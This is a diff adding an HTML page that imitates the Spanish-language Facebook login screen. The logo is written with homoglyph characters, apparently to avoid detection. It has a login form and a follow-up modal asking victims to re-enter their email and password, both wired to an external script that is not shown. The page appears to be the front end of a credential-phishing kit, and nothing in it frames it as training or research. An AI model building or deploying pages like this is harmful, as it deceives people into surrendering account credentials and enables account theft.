@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Inicia sesión o regístrate</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <div class="logo">
+                <h1>fаceвοοκ</h1>
+            </div>
+            <p class="tagline">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+        </div>
+        
+        <div class="right-section">
+            <div class="login-box">
+                <form id="loginForm">
+                    <input type="text" id="email" placeholder="Correo electrónico o número de teléfono" required>
+                    <input type="password" id="password" placeholder="Contraseña" required>
+                    <button type="submit" class="login-btn">Iniciar sesión</button>
+                </form>
+                
+                <div class="forgot-password">
+                    <a href="#">¿Olvidaste tu contraseña?</a>
+                </div>
+                
+                <hr class="divider">
+                
+                <button class="create-account-btn">Crear cuenta nueva</button>
+            </div>
+            
+            <div class="page-info">
+                <p><strong>Crea una página</strong> para una celebridad, una marca o un negocio.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal de confirmación -->
+    <div id="confirmModal" class="modal">
+        <div class="modal-content">
+            <h3>Confirma tus datos</h3>
+            <p>Por favor, confirma tu información:</p>
+            <input type="text" id="confirmEmail" placeholder="Confirma tu correo electrónico" required>
+            <input type="password" id="confirmPassword" placeholder="Confirma tu contraseña" required>
+            <div class="modal-buttons">
+                <button id="confirmBtn" class="confirm-btn">Confirmar</button>
+                <button id="cancelBtn" class="cancel-btn">Cancelar</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script_server.js"></script>
+</body>
+</html>
